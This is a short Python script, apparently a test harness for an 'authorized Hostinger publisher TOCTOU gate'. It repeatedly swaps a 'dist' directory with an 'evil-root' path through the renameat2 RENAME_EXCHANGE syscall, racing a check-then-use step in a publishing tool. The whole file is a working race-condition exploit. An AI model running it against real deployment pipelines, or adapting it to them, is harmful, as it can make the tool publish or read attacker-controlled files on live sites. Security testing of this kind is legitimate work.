#!/usr/bin/env python3
"""Atomic owned-path exchange for an authorized Hostinger publisher TOCTOU gate."""

from __future__ import annotations

import ctypes
import os
import time


SYS_RENAMEAT2 = 316
AT_FDCWD = -100
RENAME_EXCHANGE = 2
libc = ctypes.CDLL(None, use_errno=True)
dist = os.fsencode("dist")
alternate = os.fsencode("evil-root")
deadline = time.monotonic() + 20.0

while time.monotonic() < deadline:
    time.sleep(0.004)
    result = libc.syscall(
        SYS_RENAMEAT2,
        AT_FDCWD,
        ctypes.c_char_p(dist),
        AT_FDCWD,
        ctypes.c_char_p(alternate),
        RENAME_EXCHANGE,
    )
    if result != 0:
        break
    time.sleep(0.001)
    result = libc.syscall(
        SYS_RENAMEAT2,
        AT_FDCWD,
        ctypes.c_char_p(dist),
        AT_FDCWD,
        ctypes.c_char_p(alternate),
        RENAME_EXCHANGE,
    )
    if result != 0:
        break

try:
    if os.path.islink("dist") and os.path.isdir("evil-root"):
        libc.syscall(
            SYS_RENAMEAT2,
            AT_FDCWD,
            ctypes.c_char_p(dist),
            AT_FDCWD,
            ctypes.c_char_p(alternate),
            RENAME_EXCHANGE,
        )
except OSError:
    pass
